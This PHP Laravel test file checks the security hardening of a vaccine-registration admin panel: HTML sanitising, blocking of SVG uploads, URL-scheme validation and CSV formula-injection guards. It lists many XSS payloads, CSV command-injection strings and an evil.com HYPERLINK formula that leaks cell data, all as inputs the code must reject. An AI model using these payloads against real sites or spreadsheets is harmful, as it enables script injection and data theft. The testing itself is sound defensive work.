<?php

namespace Tests\Feature;

use App\Models\User;
use Illuminate\Foundation\Testing\DatabaseTransactions;
use Illuminate\Http\UploadedFile;
use Illuminate\Support\Facades\Storage;
use Modules\VaccineRegistration\Models\Article;
use Modules\VaccineRegistration\Models\Center;
use Modules\VaccineRegistration\Models\Registration;
use Modules\VaccineRegistration\Models\Vaccine;
use App\Services\Security\HtmlSanitizer;
use Tests\TestCase;

class ContentSecurityAndHardeningTest extends TestCase
{
    use DatabaseTransactions;

    protected User $superAdmin;
    protected Center $center;

    protected function setUp(): void
    {
        parent::setUp();

        $this->center = Center::firstOrCreate(
            ['slug' => 'test-center-m4'],
            [
                'name' => 'Trung Tâm Test M4',
                'address' => '123 Đường Test, Cần Thơ',
                'phone' => '0938603839',
                'map_url' => 'https://www.google.com/maps/embed?pb=test',
                'is_active' => true,
                'sort_order' => 1,
            ]
        );

        $this->superAdmin = User::firstOrCreate(
            ['email' => 'superadmin_m4@medicare.local'],
            [
                'name' => 'Super Admin M4',
                'username' => 'superadmin_m4',
                'password' => bcrypt('password123'),
                'role' => 'super_admin',
                'is_active' => true,
                'status' => 'active',
            ]
        );
    }

    /**
     * Test 1: HTML Sanitization (Stored XSS Prevention)
     */
    public function test_html_sanitizer_directly_strips_malicious_scripts_and_events(): void
    {
        $maliciousHtml = '<script>alert("XSS")</script><p>Nội dung an toàn</p><img src="x" onerror="alert(1)"><a href="javascript:alert(2)">Link</a><div onload="alert(3)">Div</div>';
        $cleaned = HtmlSanitizer::clean($maliciousHtml);

        $this->assertStringNotContainsString('<script', $cleaned);
        $this->assertStringNotContainsString('alert', $cleaned);
        $this->assertStringNotContainsString('onerror', $cleaned);
        $this->assertStringNotContainsString('onload', $cleaned);
        $this->assertStringNotContainsString('javascript:', $cleaned);
        $this->assertStringContainsString('Nội dung an toàn', $cleaned);
    }

    public function test_article_store_and_update_sanitize_content_to_prevent_stored_xss(): void
    {
        $payload = [
            'title' => 'Bài viết Test XSS ' . uniqid(),
            'category' => 'Tin tức y tế',
            'summary' => 'Tóm tắt bài viết',
            'content' => '<h2>Tiêu đề</h2><script>alert("hack")</script><p onload="bad()">Đoạn văn</p><img src="test.jpg" onerror="evil()"><a href="javascript:doEvil()">Xem thêm</a>',
            'is_published' => '1',
        ];

        $response = $this->actingAs($this->superAdmin)
            ->withSession(['admin_logged_in' => true, 'admin_user_id' => $this->superAdmin->id])
            ->post(route('admin.articles.store'), $payload);

        $response->assertRedirect(route('admin.articles.index'));

        $article = Article::where('title', $payload['title'])->firstOrFail();
        $this->assertStringNotContainsString('<script', $article->content);
        $this->assertStringNotContainsString('onerror', $article->content);
        $this->assertStringNotContainsString('onload', $article->content);
        $this->assertStringNotContainsString('javascript:', $article->content);
        $this->assertStringContainsString('<h2>Tiêu đề</h2>', $article->content);
        $this->assertStringContainsString('Đoạn văn', $article->content);

        // Test Update
        $updatePayload = array_merge($payload, [
            'title' => 'Cập nhật Bài viết Test XSS ' . uniqid(),
            'content' => '<div>Nội dung mới <iframe src="evil.com"></iframe><script>evil()</script><a href="data:text/html;base64,evil">Data Link</a></div>',
        ]);

        $updateResponse = $this->actingAs($this->superAdmin)
            ->withSession(['admin_logged_in' => true, 'admin_user_id' => $this->superAdmin->id])
            ->put(route('admin.articles.update', $article->id), $updatePayload);

        $updateResponse->assertRedirect(route('admin.articles.index'));

        $article->refresh();
        $this->assertStringNotContainsString('<iframe', $article->content);
        $this->assertStringNotContainsString('<script', $article->content);
        $this->assertStringNotContainsString('data:text/html', $article->content);
        $this->assertStringContainsString('Nội dung mới', $article->content);
    }

    /**
     * Test 2: SVG Upload Blocking across ALL Admin Upload Endpoints
     */
    public function test_article_image_upload_rejects_svg_file(): void
    {
        $svgFile = UploadedFile::fake()->create('malicious.svg', 10, 'image/svg+xml');

        $response = $this->actingAs($this->superAdmin)
            ->withSession(['admin_logged_in' => true, 'admin_user_id' => $this->superAdmin->id])
            ->post(route('admin.articles.store'), [
                'title' => 'Test SVG Article',
                'category' => 'Y học',
                'image_file' => $svgFile,
            ]);

        $response->assertSessionHasErrors(['image_file']);
    }

    public function test_editor_image_upload_rejects_svg_file(): void
    {
        $svgFile = UploadedFile::fake()->create('exploit.svg', 10, 'image/svg+xml');

        $response = $this->actingAs($this->superAdmin)
            ->withSession(['admin_logged_in' => true, 'admin_user_id' => $this->superAdmin->id])
            ->postJson(route('admin.articles.upload-image'), [
                'file' => $svgFile,
            ]);

        $response->assertStatus(422);
    }

    public function test_vaccine_image_upload_rejects_svg_file(): void
    {
        $svgFile = UploadedFile::fake()->create('vaccine_icon.svg', 10, 'image/svg+xml');

        $response = $this->actingAs($this->superAdmin)
            ->withSession(['admin_logged_in' => true, 'admin_user_id' => $this->superAdmin->id])
            ->post(route('admin.vaccines.store'), [
                'name' => 'Vaccine SVG Test',
                'center_id' => $this->center->id,
                'price' => 100000,
                'doses' => 1,
                'stock_status' => 'available',
                'disease_prevention' => 'Bệnh cúm',
                'age_group' => 'Trẻ em',
                'origin' => 'Việt Nam',
                'image_file' => $svgFile,
            ]);

        $response->assertSessionHasErrors(['image_file']);
    }

    public function test_banner_image_upload_rejects_svg_file(): void
    {
        $svgFile = UploadedFile::fake()->create('banner.svg', 10, 'image/svg+xml');

        $response = $this->actingAs($this->superAdmin)
            ->withSession(['admin_logged_in' => true, 'admin_user_id' => $this->superAdmin->id])
            ->post(route('admin.banners.store'), [
                'title' => 'Banner SVG Test',
                'image_file' => $svgFile,
            ]);

        $response->assertSessionHasErrors(['image_file']);
    }

    public function test_valid_raster_image_uploads_are_accepted(): void
    {
        $pngFile = UploadedFile::fake()->create('article.png', 100, 'image/png');

        $response = $this->actingAs($this->superAdmin)
            ->withSession(['admin_logged_in' => true, 'admin_user_id' => $this->superAdmin->id])
            ->post(route('admin.articles.store'), [
                'title' => 'Valid PNG Article ' . uniqid(),
                'category' => 'Y học',
                'image_file' => $pngFile,
            ]);

        $response->assertRedirect(route('admin.articles.index'));
    }

    /**
     * Test 3: Dangerous URL Scheme Filtering
     */
    public function test_banner_link_rejects_javascript_and_data_schemes(): void
    {
        $dangerousLinks = [
            'javascript:alert(1)',
            'JAVASCRIPT:alert(1)',
            ' javascript:alert(1)',
            'data:text/html;base64,PHN2Zz4=',
            'vbscript:msgbox(1)',
        ];

        foreach ($dangerousLinks as $link) {
            $response = $this->actingAs($this->superAdmin)
                ->withSession(['admin_logged_in' => true, 'admin_user_id' => $this->superAdmin->id])
                ->post(route('admin.banners.store'), [
                    'title' => 'Banner Link Security Test',
                    'image_url' => '/images/banners/valid.png',
                    'link_url' => $link,
                ]);

            $response->assertSessionHasErrors(['link_url']);
        }
    }

    public function test_center_map_url_rejects_javascript_and_data_schemes(): void
    {
        $dangerousMaps = [
            'javascript:alert(1)',
            'data:text/html;base64,1234',
        ];

        foreach ($dangerousMaps as $mapUrl) {
            $response = $this->actingAs($this->superAdmin)
                ->withSession(['admin_logged_in' => true, 'admin_user_id' => $this->superAdmin->id])
                ->post(route('admin.centers.store'), [
                    'name' => 'Chi nhánh Malicious Map',
                    'address' => '123 Đường ABC',
                    'is_active' => 1,
                    'map_url' => $mapUrl,
                ]);

            $response->assertSessionHasErrors(['map_url']);
        }
    }

    public function test_valid_banner_and_map_urls_pass_validation(): void
    {
        $responseBanner = $this->actingAs($this->superAdmin)
            ->withSession(['admin_logged_in' => true, 'admin_user_id' => $this->superAdmin->id])
            ->post(route('admin.banners.store'), [
                'title' => 'Banner Link Valid Test ' . uniqid(),
                'image_url' => '/images/banners/valid.png',
                'link_url' => 'https://medicarecodo.vn/khuyen-mai',
            ]);

        $responseBanner->assertRedirect(route('admin.banners.index'));

        $responseCenter = $this->actingAs($this->superAdmin)
            ->withSession(['admin_logged_in' => true, 'admin_user_id' => $this->superAdmin->id])
            ->post(route('admin.centers.store'), [
                'name' => 'Chi nhánh Valid Map ' . uniqid(),
                'address' => '456 Đường DEF',
                'is_active' => 1,
                'map_url' => 'https://www.google.com/maps/embed?pb=valid_map_embed',
            ]);

        $responseCenter->assertRedirect(route('admin.centers.index'));
    }

    /**
     * Test 4: CSV Export Formula Injection Guard
     */
    public function test_csv_export_sanitizes_formula_injection_cells(): void
    {
        $vaccine = Vaccine::firstOrCreate(
            ['name' => 'Vắc xin Cúm Test CSV'],
            [
                'price' => 200000,
                'doses' => 1,
                'stock_status' => 'available',
                'disease_prevention' => 'Cúm mùa',
                'age_group' => 'Mọi độ tuổi',
                'origin' => 'Pháp',
            ]
        );

        Registration::where('registration_code', '=CMD|"/C calc"!A0')->delete();

        $registration = Registration::create([
            'registration_code' => '=CMD|"/C calc"!A0',
            'patient_name' => '@HackerName',
            'patient_dob' => '1995-01-01',
            'patient_gender' => 'Nam',
            'patient_phone' => '+0938603839',
            'patient_address' => '  -1+1',
            'center_id' => $this->center->id,
            'center_name' => $this->center->name,
            'injection_date' => date('Y-m-d'),
            'payment_method' => 'cash',
            'total_price' => 200000,
            'status' => 'Chờ thanh toán',
        ]);

        $registration->vaccines()->attach($vaccine->id, ['price' => 200000, 'quantity' => 1]);

        $response = $this->actingAs($this->superAdmin)
            ->withSession(['admin_logged_in' => true, 'admin_user_id' => $this->superAdmin->id])
            ->get(route('admin.registrations.export.csv'));

        $response->assertStatus(200);
        $response->assertHeader('Content-Type', 'text/csv; charset=UTF-8');

        $content = $response->streamedContent();

        $this->assertStringContainsString("'=CMD", $content);
        $this->assertStringContainsString("'@HackerName", $content);
        $this->assertStringContainsString("'+0938603839", $content);
    }

    /**
     * Adversarial Stress Tests: Stored XSS Obfuscation & Bypasses
     */
    public function test_adversarial_stored_xss_obfuscation_bypasses(): void
    {
        $payloads = [
            '<svg/onload=alert(1)>' => ['onload', 'alert', '<svg'],
            '<a href="   JAVASCRIPT:alert(1)">Click Me</a>' => ['javascript:', 'JAVASCRIPT:'],
            '<img src=x onerror=alert`1`>' => ['onerror'],
            '<DIV ONCLICK="alert(1)">UpperCase Tag & Event</DIV>' => ['ONCLICK', 'onclick'],
            '<script/src=data:text/javascript,alert(1)></script>' => ['<script', 'data:text/javascript'],
            '<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></iframe>' => ['<iframe', 'data:text/html'],
            '<a href="data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMSk+">Data Link</a>' => ['data:text/html'],
            '<a href="vbscript:msgbox(1)">VBScript Link</a>' => ['vbscript:'],
            '<<script>script>alert(1)</script>' => ['<script>alert'],
            '<img src="javascript:alert(1)">' => ['javascript:'],
                      '<p style="xss:expression(alert(1))">Style Expression' => ['expression(alert'],
        ];

        foreach ($payloads as $input => $forbiddenStrings) {
            $cleaned = HtmlSanitizer::clean($input);

            foreach ($forbiddenStrings as $forbidden) {
                $this->assertStringNotContainsString(
                    strtolower($forbidden),
                    strtolower($cleaned),
                    "Failed XSS sanitization check for forbidden pattern '{$forbidden}' in payload: {$input}. Sanitized output: {$cleaned}"
                );
            }
        }

        // Verify nested tag unwrapping strips dangerous href attributes
        $bypassInput = '<math><mtext><option><a href="javascript:alert(1)">click</a></option></mtext></math>';
        $cleanedBypass = HtmlSanitizer::clean($bypassInput);
        $this->assertStringNotContainsString('javascript:', $cleanedBypass);

        // Document <<script> double-tag residual text escaping.
        $doubleTagInput = '<<script>script>alert(1)</script>';
        $cleanedDoubleTag = HtmlSanitizer::clean($doubleTagInput);
        $this->assertSame('script&gt;alert(1)', $cleanedDoubleTag);
    }

    /**
     * Adversarial Stress Tests: SVG Upload Bypasses across Endpoints
     */
    public function test_adversarial_svg_upload_bypasses(): void
    {
        // 1. Polyglot / Mixed extension SVG (.svg) - rejected by mimes rule because extension is svg
        $polyglotSvg = UploadedFile::fake()->create('shell.png.svg', 10, 'image/svg+xml');
        $res1 = $this->actingAs($this->superAdmin)
            ->withSession(['admin_logged_in' => true, 'admin_user_id' => $this->superAdmin->id])
            ->post(route('admin.banners.store'), [
                'title' => 'Polyglot SVG Banner',
                'image_file' => $polyglotSvg,
            ]);
        $res1->assertSessionHasErrors(['image_file']);

        // 2. SVG content disguised as PNG extension - BYPASS DEMONSTRATION (Laravel mimes rule inspects extension/mime guess)
        $svgContent = '<?xml version="1.0" standalone="no"?><svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>';
        $svgWithPngExt = UploadedFile::fake()->createWithContent('malicious.png', $svgContent);
        $res2 = $this->actingAs($this->superAdmin)
            ->withSession(['admin_logged_in' => true, 'admin_user_id' => $this->superAdmin->id])
            ->post(route('admin.articles.store'), [
                'title' => 'SVG Content with PNG Ext ' . uniqid(),
                'category' => 'Y học',
                'summary' => 'Tóm tắt',
                'image_file' => $svgWithPngExt,
            ]);
        // Disguised SVG content with .png extension is blocked by SafeImageFile validation rule
        $res2->assertSessionHasErrors(['image_file']);

        // 3. Fake PNG MIME with .svg extension - rejected because extension is .svg
        $fakePngExtensionSvg = UploadedFile::fake()->create('exploit.svg', 10, 'image/svg+xml');
        $res3 = $this->actingAs($this->superAdmin)
            ->withSession(['admin_logged_in' => true, 'admin_user_id' => $this->superAdmin->id])
            ->post(route('admin.articles.store'), [
                'title' => 'Fake PNG Ext SVG ' . uniqid(),
                'category' => 'Y học',
                'summary' => 'Tóm tắt',
                'image_file' => $fakePngExtensionSvg,
            ]);
        $res3->assertSessionHasErrors(['image_file']);

        // 4. Case manipulation extension (.SVG) - rejected by Laravel mimes rule
        $upperSvg = UploadedFile::fake()->create('test.SVG', 10, 'image/svg+xml');
        $res4 = $this->actingAs($this->superAdmin)
            ->withSession(['admin_logged_in' => true, 'admin_user_id' => $this->superAdmin->id])
            ->post(route('admin.vaccines.store'), [
                'name' => 'Vaccine Upper SVG',
                'center_id' => $this->center->id,
                'price' => 100000,
                'doses' => 1,
                'stock_status' => 'available',
                'disease_prevention' => 'Bệnh cúm',
                'age_group' => 'Trẻ em',
                'origin' => 'Việt Nam',
                'image_file' => $upperSvg,
            ]);
        $res4->assertSessionHasErrors(['image_file']);
    }

    /**
     * Adversarial Stress Tests: Dangerous URL Schemes
     */
    public function test_adversarial_dangerous_url_schemes(): void
    {
        $dangerousUrls = [
            'javascript:alert(1)',
            'JAVASCRIPT:alert(1)',
            'JaVaScRiPt:alert(1)',
            ' javascript:alert(1)',
            "\tjavascript:alert(1)",
            "\njavascript:alert(1)",
            'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
            'DATA:text/html;base64,PHNjcmlwdD4=',
            'vbscript:msgbox(1)',
            'VBSCRIPT:msgbox(1)',
            'javascript://%0Aalert(1)',
            'data:image/svg+xml;base64,PHN2Zz4=',
        ];

        foreach ($dangerousUrls as $url) {
            // Test Banner link_url validation
            $resBanner = $this->actingAs($this->superAdmin)
                ->withSession(['admin_logged_in' => true, 'admin_user_id' => $this->superAdmin->id])
                ->post(route('admin.banners.store'), [
                    'title' => 'Adv URL Test Banner',
                    'image_url' => '/images/banners/valid.png',
                    'link_url' => $url,
                ]);
            $resBanner->assertSessionHasErrors(['link_url']);

            // Test Center map_url validation
            $resCenter = $this->actingAs($this->superAdmin)
                ->withSession(['admin_logged_in' => true, 'admin_user_id' => $this->superAdmin->id])
                ->post(route('admin.centers.store'), [
                    'name' => 'Adv URL Test Center ' . uniqid(),
                    'address' => '123 Street',
                    'is_active' => 1,
                    'map_url' => $url,
                ]);
            $resCenter->assertSessionHasErrors(['map_url']);
        }
    }

    /**
     * Adversarial Stress Tests: CSV Formula Injection Payload Variants
     */
    public function test_adversarial_csv_formula_injection_payloads(): void
    {
        $formulaPayloads = [
            '=CMD|"/C calc"!A0',
            '+1+1',
            '-1+1',
            '@SUM(A1:A10)',
            '  =SUM(1,2)',
            "\t-2+5",
            "\n+cmd|' /C calc'!A0",
            '=HYPERLINK("http://evil.com?leak="&A1,"Click")',
        ];

        foreach ($formulaPayloads as $raw) {
            $sanitized = \App\Services\Security\CsvSanitizer::sanitizeCell($raw);
            if (preg_match('/^\s*[=\-+@]/', $raw)) {
                $this->assertStringStartsWith("'", $sanitized, "Failed CSV formula prefix check for payload: {$raw}");
            }
        }
    }
}
